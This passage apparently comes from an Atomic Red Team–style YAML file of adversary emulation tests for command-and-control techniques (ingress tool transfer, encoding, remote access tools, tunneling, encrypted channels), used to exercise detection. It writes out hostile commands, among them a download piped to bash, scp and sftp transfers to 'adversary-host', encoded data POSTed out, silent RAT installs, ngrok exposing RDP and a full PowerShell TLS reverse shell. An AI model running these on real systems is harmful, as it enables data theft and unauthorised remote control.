      platform: windows
      command: certreq.exe -Post -config https://example.com c:\windows\win.ini %temp%\Atomic-license.txt
      cleanup: del %temp%\Atomic-license.txt >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Download a file using wscript
      type: cmd
      platform: windows
      command: wscript.exe "PathToAtomicsFolder\T1105\src\T1105-download-file.vbs"
      cleanup: del Atomic-License.txt >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Linux Download File and Run
      type: sh
      platform: linux
      command: curl -sO https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/src/atomic.sh; chmod +x atomic.sh | bash atomic.sh
      cleanup: rm atomic.sh
      timeout: 60
      is_safe: true
    - name: Nimgrab - Transfer Files
      type: cmd
      platform: windows
      command: cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt $env:TEMP\Atomic-license.txt
      cleanup: del $env:TEMP\Atomic-license.txt >nul 2>&1
      timeout: 120
      is_safe: true
    - name: iwr or Invoke Web-Request download
      type: cmd
      platform: windows
      command: powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt
      cleanup: del %temp%\Atomic-license.txt >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Arbitrary file download using the Notepad++ GUP.exe binary
      type: cmd
      platform: windows
      command: |-
        mkdir "c:\Temp"
        cd PathToAtomicsFolder\T1105\bin\
        GUP.exe -unzipTo "" "C:\Temp" "Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"
      cleanup: rmdir /s /q "C:\Temp\Sample" >nul 2>nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: File download via nscurl
      type: sh
      platform: macos
      command: nscurl -k "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt" -o "license.txt"
      cleanup: rm "license.txt"
      timeout: 60
      is_safe: true
    - name: File Download with Sqlcmd.exe
      type: powershell
      platform: windows
      command: sqlcmd -i https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip -o C:\T1105.zip
      cleanup: rm "C:\T1105.zip" 2>$null | Out-Null
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Remote File Copy using PSCP
      type: cmd
      platform: windows
      command: |-
        fsutil file createnew C:\Temp\T1105_scp.zip 1048576
        echo y | PathToAtomicsFolder\..\ExternalPayloads\pscp.exe -P 22 -pw atomic C:\Temp\T1105_scp.zip atomic@127.0.0.1:T1105_scp.zip
      cleanup: del /f /q C:\Temp\T1105_scp.zip
      timeout: 120
      is_safe: false
    - name: Windows push file using scp.exe
      type: powershell
      platform: windows
      command: |-
        # Check if the folder exists, create it if it doesn't
        $folderPath = "C:\temp"
        if (-Not (Test-Path -Path $folderPath)) {
            New-Item -Path $folderPath -ItemType Directory
        }

        # Create the file
        $filePath = Join-Path -Path $folderPath -ChildPath "T1105.txt"
        New-Item -Path $filePath -ItemType File -Force
        Write-Output "File created: $filePath"

        # Attack command
        scp.exe C:\temp\T1105.txt adversary@adversary-host:/tmp/
      cleanup: |-
        $filePath = Join-Path -Path "C:\temp" -ChildPath "T1105.txt"
        Remove-Item -Path $filePath -Force -erroraction silentlycontinue
        Write-Output "File deleted: $filePath"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows pull file using scp.exe
      type: powershell
      platform: windows
      command: scp.exe adversary@adversary-host:/tmp/T1105.txt C:\temp
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows push file using sftp.exe
      type: powershell
      platform: windows
      command: |-
        # Check if the folder exists, create it if it doesn't
        $folderPath = "C:\temp"
        if (-Not (Test-Path -Path $folderPath)) {
            New-Item -Path $folderPath -ItemType Directory
        }
        # Create the file
        $filePath = Join-Path -Path $folderPath -ChildPath "T1105.txt"
        New-Item -Path $filePath -ItemType File -Force
        Write-Output "File created: $filePath"
        # Attack command
        echo "put C:\temp\T1105.txt" | sftp adversary@adversary-host:/tmp
      cleanup: |-
        $filePath = Join-Path -Path "C:\temp" -ChildPath "T1105.txt"
        Remove-Item -Path $filePath -Force
        Write-Output "File deleted: $filePath"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Windows pull file using sftp.exe
      type: powershell
      platform: windows
      command: sftp.exe adversary@adversary-host:/tmp/T1105.txt C:\temp
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Download a file with OneDrive Standalone Updater
      type: powershell
      platform: windows
      command: |-
        if (-not (Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe")) {
            Write-Host "OneDriveStandaloneUpdater.exe not found at C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe. Test cannot continue."
            exit 1
        }

        New-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force | Out-Null
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateRingSettingURLFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt" -Type String -Force
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "ODSUUpdateXMLUrlFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt" -Type String -Force
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateXMLUrlFromOC" -Value "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt" -Type String -Force
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Name "UpdateOfficeConfigTimestamp" -Value 99999999999 -Type QWord -Force

        # Run OneDrive Standalone Updater
        & "C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"
      cleanup: |-
        Remove-Item -Path "HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig" -Force -ErrorAction Ignore
        Remove-Item -Path "$env:LOCALAPPDATA\Microsoft\OneDrive\StandaloneUpdater\PreSignInSettingsConfig.json" -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1105
  is_safe: true
- id: T1132.001
  name: Standard Encoding
  description: Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.[1](https://en.wikipedia.org/wiki/Binary-to-text_encoding)[2](https://en.wikipedia.org/wiki/Character_encoding) Some data encoding systems may also result in data compression, such as gzip.
  tactic: command-and-control
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Base64 Encoded data.
      type: sh
      platform: macos
      command: |-
        echo -n 111-11-1111 | base64
        curl -XPOST MTExLTExLTExMTE=.redcanary.com
      timeout: 60
      is_safe: true
    - name: Base64 Encoded data.
      type: sh
      platform: linux
      command: |-
        echo -n 111-11-1111 | base64
        curl -XPOST MTExLTExLTExMTE=.redcanary.com
      timeout: 60
      is_safe: true
    - name: Base64 Encoded data (freebsd)
      type: sh
      platform: linux
      command: |-
        echo -n 111-11-1111 | b64encode -r -
        curl -XPOST MTExLTExLTExMTE=.redcanary.com
      timeout: 60
      is_safe: true
    - name: XOR Encoded data.
      type: powershell
      platform: windows
      command: |-
        $plaintext = ([system.Text.Encoding]::UTF8.getBytes("Path\n----\nC:\Users\victim"))
        $key = "abcdefghijklmnopqrstuvwxyz123456"
        $cyphertext =  @();
        for ($i = 0; $i -lt $plaintext.Count; $i++) {
         $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
        }
        $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
        [System.Net.ServicePointManager]::Expect100Continue = $false
        Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1132/001
  is_safe: true
- id: T1219
  name: Remote Access Tools
  description: |-
    An adversary may use legitimate remote access tools to establish an interactive command and control channel within a network. Remote access tools create a session between two trusted hosts through a graphical interface, a command line interaction, a protocol tunnel via development or management software, or hardware-level access such as KVM (Keyboard, Video, Mouse) over IP solutions. Desktop support software (usually graphical interface) and remote management software (typically command line interface) allow a user to control a computer remotely as if they are a local user inheriting the user or software permissions. This software is commonly used for troubleshooting, software installation, and system management.[1](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf)[2](https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf)[3](https://blog.crysys.hu/2013/03/teamspy/) Adversaries may similarly abuse response features included in EDR and other defensive tools that enable remote access.

    Remote access tools may be installed and used post-compromise as an alternate communications channel for redundant access or to establish an interactive remote desktop session with the target system. It may also be used as a malware component to establish a reverse connection or back-connect to a service or adversary-controlled system.

    Installation of many remote access tools may also include persistence (e.g., the software's installation routine creates a [Windows Service](https://attack.mitre.org/techniques/T1543/003)). Remote access modules/features may also exist as part of otherwise existing software (e.g., Google Chrome’s Remote Desktop).[4](https://support.google.com/chrome/answer/1649523)[5](https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708)
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: TeamViewer Files Detected Test on Windows
      type: powershell
      platform: windows
      command: "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\TeamViewer_Setup.exe\"\nStart-Process -Wait $file1 /S; \nStart-Process 'C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe'"
      cleanup: |-
        $file = 'C:\Program Files (x86)\TeamViewer\uninstall.exe'
        if(Test-Path $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }
        $file1 = "C:\Users\" + $env:username + "\Desktop\TeamViewer_Setup.exe"
        Remove-Item $file1 -ErrorAction Ignore | Out-Null
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: AnyDesk Files Detected Test on Windows
      type: powershell
      platform: windows
      command: |-
        Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe
        $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
        Start-Process $file1 /S;
      cleanup: |-
        $file1 = "C:\Users\" + $env:username + "\Desktop\AnyDesk.exe"
        Remove-Item $file1 -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: LogMeIn Files Detected Test on Windows
      type: powershell
      platform: windows
      command: |-
        Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
        $file1 = "C:\Users\" + $env:username + "\Desktop\LogMeInIgnition.msi"
        Start-Process -Wait $file1 /quiet;
        Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' "/S"
      cleanup: "get-package *'LogMeIn Client'* -ErrorAction Ignore | uninstall-package \n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\LogMeInIgnition.msi\"\nRemove-Item $file1 -ErrorAction Ignore"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: GoToAssist Files Detected Test on Windows
      type: powershell
      platform: windows
      command: |-
        Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe "https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1"
        $file1 = "C:\Users\" + $env:username + "\Downloads\GoToAssist.exe"
        Start-Process $file1 /S;
      cleanup: try{"$PathToAtomicsFolder/T1219/bin/GoToCleanup.ps1"} catch{}
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: ScreenConnect Application Download and Install on Windows
      type: powershell
      platform: windows
      command: |-
        $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
        Invoke-WebRequest -OutFile $installer "https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_25.1.10.9197_Release.msi"
        msiexec /i $installer /qn
      cleanup: |-
        $installer = "C:\Users\$env:username\Downloads\ScreenConnect.msi"
        msiexec /x $installer /qn
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Ammyy Admin Software Execution
      type: powershell
      platform: windows
      command: Start-Process "PathToAtomicsFolder\..\ExternalPayloads\ammyy.exe"
      cleanup: Stop-Process -Name "Ammyy" -force -erroraction silentlycontinue
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: RemotePC Software Execution
      type: powershell
      platform: windows
      command: Start-Process "PathToAtomicsFolder\..\ExternalPayloads\RemotePC.exe"
      cleanup: "Unregister-ScheduledTask -TaskName \"RemotePC\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"RPCServiceHealthCheck\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"ServiceMonitor\" -Confirm:$False -ErrorAction SilentlyContinue\nUnregister-ScheduledTask -TaskName \"StartRPCService\" -Confirm:$False -ErrorAction SilentlyContinue      \nStop-Process -Name \"RemotePCPerformance\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCPerformanceService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCUIU\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCDownloader\" -force -erroraction silentlycontinue\nStop-Process -Name \"RemotePCService\" -force -erroraction silentlycontinue\nStop-Process -Name \"RPCService\" -force -erroraction silentlycontinue"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: NetSupport - RAT Execution
      type: powershell
      platform: windows
      command: Start-Process "PathToAtomicsFolder\..\ExternalPayloads\T1219_NetSupport.exe" -ArgumentList "/S /v/qn"
      cleanup: Stop-Process -Name "client32" -force -erroraction silentlycontinue
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: UltraViewer - RAT Execution
      type: powershell
      platform: windows
      command: |-
        Start-Process -Wait -FilePath "PathToAtomicsFolder\..\ExternalPayloads\T1219_UltraViewer.exe" -Argument "/silent" -PassThru
        Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'
      cleanup: Stop-Process -Name "UltraViewer_Desktop" -Force -ErrorAction SilentlyContinue
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: UltraVNC Execution
      type: powershell
      platform: windows
      command: Start-Process $env:ProgramFiles\'uvnc bvba\UltraVnc\vncviewer.exe'
      cleanup: Stop-Process -Name "vncviewer" -force -erroraction silentlycontinue
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: MSP360 Connect Execution
      type: powershell
      platform: windows
      command: Start-Process $env:ProgramFiles\Connect\Connect.exe
      cleanup: Stop-Process -Name "Connect" -force -erroraction silentlycontinue
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: RustDesk Files Detected Test on Windows
      type: powershell
      platform: windows
      command: |-
        $file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe"
        Invoke-WebRequest  -OutFile $file https://github.com/rustdesk/rustdesk/releases/download/1.2.3-1/rustdesk-1.2.3-1-x86_64.exe
        Start-Process -FilePath $file "/S"
      cleanup: |-
        $file = Join-Path $env:USERPROFILE "Desktop\rustdesk-1.2.3-1-x86_64.exe"
        Remove-Item $file1 -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Splashtop Execution
      type: powershell
      platform: windows
      command: Start-Process "${env:programfiles(x86)}\Splashtop\Splashtop Remote\Client for STP\strwinclt.exe"
      cleanup: Stop-Process -Name "strwinclt" -force -erroraction silentlycontinue
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Splashtop Streamer Execution
      type: powershell
      platform: windows
      command: Start-Process -FilePath "C:Program Files (x86)\Splashtop\Splashtop Remote\Server\SRServer.exe"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Microsoft App Quick Assist Execution
      type: powershell
      platform: windows
      command: Start-Process "shell:AppsFolder\MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe!App"
      cleanup: Stop-Process -Name quickassist
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1219
  is_safe: true
- id: T1571
  name: Non-Standard Port
  description: |-
    Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088[1](https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage) or port 587[2](https://www.fortinet.com/blog/threat-research/analysis-of-new-agent-tesla-spyware-variant.html) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.

    Adversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.[3](https://x.com/TheDFIRReport/status/1498657772254240768)
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Testing usage of uncommonly used port with PowerShell
      type: powershell
      platform: windows
      command: Test-NetConnection -ComputerName google.com -port 8081
      timeout: 120
      is_safe: true
    - name: Testing usage of uncommonly used port
      type: sh
      platform: linux
      command: |-
        echo quit | telnet google.com 8081
        exit 0
      timeout: 60
      is_safe: true
    - name: Testing usage of uncommonly used port
      type: sh
      platform: macos
      command: |-
        echo quit | telnet google.com 8081
        exit 0
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1571
  is_safe: true
- id: T1572
  name: Protocol Tunneling
  description: "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \n\nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.[1](https://www.ssh.com/ssh/tunneling)[2](https://www.sygnia.co/blog/abyss-locker-ransomware-attack-analysis/) \n\n[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.[3](https://www.bleepingcomputer.com/news/security/new-godlua-malware-evades-traffic-monitoring-via-dns-over-https/) \n\nAdversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure."
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: DNS over HTTPS Large Query Volume
      type: powershell
      platform: windows
      command: for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest "https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT" -UseBasicParsing).Content }
      timeout: 120
      is_safe: true
    - name: DNS over HTTPS Regular Beaconing
      type: powershell
      platform: windows
      command: |-
        Set-Location "PathToAtomicsFolder"
        .\T1572\src\T1572-doh-beacon.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30
      timeout: 120
      is_safe: true
    - name: DNS over HTTPS Long Domain Query
      type: powershell
      platform: windows
      command: |-
        Set-Location "PathToAtomicsFolder"
        .\T1572\src\T1572-doh-domain-length.ps1 -DohServer https://8.8.8.8/resolve -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT
      timeout: 120
      is_safe: true
    - name: run ngrok
      type: powershell
      platform: windows
      command: "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken N/A | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp 3389 } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null"
      cleanup: |-
        Remove-Item C:\Users\Public\ngrok -Recurse -ErrorAction Ignore
        Remove-Item C:\%userprofile%\AppData\Local\ngrok -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Microsoft Dev tunnels (Linux/macOS)
      type: bash
      platform: linux
      command: PathToAtomicsFolder/../ExternalPayloads/devtunnel host -p 8080 &
      cleanup: |-
        pkill -9 $(basename "PathToAtomicsFolder/../ExternalPayloads/devtunnel")
        PathToAtomicsFolder/../ExternalPayloads/devtunnel user logout
        rm PathToAtomicsFolder/../ExternalPayloads/devtunnel
      timeout: 60
      is_safe: false
    - name: Microsoft Dev tunnels (Linux/macOS)
      type: bash
      platform: macos
      command: PathToAtomicsFolder/../ExternalPayloads/devtunnel host -p 8080 &
      cleanup: |-
        pkill -9 $(basename "PathToAtomicsFolder/../ExternalPayloads/devtunnel")
        PathToAtomicsFolder/../ExternalPayloads/devtunnel user logout
        rm PathToAtomicsFolder/../ExternalPayloads/devtunnel
      timeout: 60
      is_safe: false
    - name: VSCode tunnels (Linux/macOS)
      type: sh
      platform: linux
      command: nohup code tunnel --accept-server-license-terms  >/dev/null 2>&1 &
      cleanup: |-
        pkill -9 tunnel
        code tunnel unregister
        code tunnel user logout
      timeout: 60
      is_safe: false
    - name: VSCode tunnels (Linux/macOS)
      type: sh
      platform: macos
      command: nohup code tunnel --accept-server-license-terms  >/dev/null 2>&1 &
      cleanup: |-
        pkill -9 tunnel
        code tunnel unregister
        code tunnel user logout
      timeout: 60
      is_safe: false
    - name: Cloudflare tunnels (Linux/macOS)
      type: sh
      platform: linux
      command: nohup PathToAtomicsFolder/../ExternalPayloads/cloudflared tunnel --url localhost:8080  >/dev/null 2>&1 &
      cleanup: |-
        pkill -9 $(basename "PathToAtomicsFolder/../ExternalPayloads/cloudflared")
        rm -f "PathToAtomicsFolder/../ExternalPayloads/cloudflared"
      timeout: 60
      is_safe: false
    - name: Cloudflare tunnels (Linux/macOS)
      type: sh
      platform: macos
      command: nohup PathToAtomicsFolder/../ExternalPayloads/cloudflared tunnel --url localhost:8080  >/dev/null 2>&1 &
      cleanup: |-
        pkill -9 $(basename "PathToAtomicsFolder/../ExternalPayloads/cloudflared")
        rm -f "PathToAtomicsFolder/../ExternalPayloads/cloudflared"
      timeout: 60
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1572
  is_safe: true
- id: T1573
  name: Encrypted Channel
  description: Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: OpenSSL C2
      type: powershell
      platform: windows
      command: |-
        $server_ip = 127.0.0.1
        $server_port = 443
        $socket = New-Object Net.Sockets.TcpClient('127.0.0.1', '443')
        $stream = $socket.GetStream()
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false)
        $writer = new-object System.IO.StreamWriter($sslStream)
        $writer.Write('PS ' + (pwd).Path + '> ')
        $writer.flush()
        [byte[]]$bytes = 0..65535|%{0};
        while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data | Out-String ) 2>&1;
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1573
  is_safe: true
